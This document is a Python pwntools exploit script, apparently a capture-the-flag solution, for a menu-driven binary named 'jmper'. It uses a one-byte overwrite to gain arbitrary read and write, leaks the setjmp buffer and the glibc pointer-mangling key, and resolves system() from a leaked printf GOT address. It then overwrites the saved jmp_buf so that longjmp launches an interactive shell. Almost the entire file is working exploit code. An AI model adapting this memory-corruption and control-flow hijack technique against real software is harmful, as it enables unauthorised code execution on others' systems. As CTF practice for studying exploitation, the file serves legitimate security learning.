from pwn import *

#context.log_level = 'debug'
context.arch='amd64'

LOCAL = True

if LOCAL:
	p = process('./jmper',raw=False)
else:
	p = remote('127.0.0.1',10001)

elf = ELF('./jmper')
libc = ELF('./libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e')
printf_got = elf.got['printf']

def rerol(d):
    return ((d<<(64-0x11))+(d>>0x11))&0xffffffffffffffff

def rol(d):
    return ((d<<0x11) + (d>>(64-0x11)))&0xffffffffffffffff

def add_student():
    p.recvuntil(':)')
    p.sendline('1')

def name_student(id,name):
    p.recvuntil(':)')
    p.sendline('2')
    p.recvuntil('ID:')
    p.sendline(str(id))
    p.recvuntil('name:')
    p.sendline(str(name))

def memo_student(id,memo):
    p.recvuntil(':)')
    p.sendline('3')
    p.recvuntil('ID:')
    p.sendline(str(id))
    p.recvuntil('memo:')
    p.sendline(str(memo))

def show_name(id):
    p.recvuntil(':)')
    p.sendline('4')
    p.recvuntil('ID:')
    p.sendline(str(id))

def show_memo(id):
    p.recvuntil(':)')
    p.sendline('5')
    p.recvuntil('ID:')
    p.sendline(str(id))

def exit_():
    p.recvuntil(':)')
    p.sendline('6')

def get_shell():
	for __ in xrange(0,25):
		add_student()
	add_student()

def main():
    #raw_input('0x0000000000400B99')
    log.info('printf got : %s' % (hex(printf_got)))
    add_student()
    add_student()
    add_student()
    add_student()
    add_student()

    name_student(0,'A')
    name_student(1,'B')
    name_student(2,'C')
    name_student(3,'D')
    name_student(4,'E')

    memo_student(0,'a')
    memo_student(1,'b')
    memo_student(2,'c')
    memo_student(3,'d')
    memo_student(4,'e')

    #get jmp buffer offset
    memo_student(1,'c' * 0x20 + '\xe8')
    name_student(1,'A')
    show_name(1)
    dump = p.recvline()
    jmp_buffer_lsw = ((ord(dump[1]) &0xf0) << 8) | 0x110
    log.info("Got jmpbuffer offset %x" % jmp_buffer_lsw)
    
    #get xor word
    rip_addr = jmp_buffer_lsw + 0x38
    name_student(1,p16(rip_addr))
    show_name(2)
    dump = p.recvline()
    rip_stored = unpack(dump[:8])
    log.info("Got stored rip : %s" % hex(rip_stored))
    rip = rerol(rip_stored)
    secret_xor = rip ^ 0x400c31
    log.info("Got xor vaule : %s" % hex(secret_xor))

    #rbx /bin/sh
    rip_addr = jmp_buffer_lsw
    name_student(1,p16(rip_addr))
    name_student(2,"/bin/sh")

    #leak addr and get system's addr
    name_student(1,p64(printf_got))
    show_name(2)
    printf_addr = u64(p.recv(6).ljust(8,'\x00'))
    log.info('leak printf : %s' % hex(printf_addr))

    libc_base = printf_addr - libc.symbols['printf']
    system_addr = libc_base + libc.symbols['system']
    log.info('system addr : %s' % hex(system_addr))

    new_rip = system_addr ^ secret_xor
    new_rip = rol(new_rip) 
    log.info('New rip is : %s' % hex(new_rip))
    memo_student(3,"D" * 0x20 + "\xc8")
    name_student(3,p16(jmp_buffer_lsw+0x38))
    name_student(4,p64(new_rip))

    get_shell()
    p.interactive()

if __name__ == '__main__':
    main()
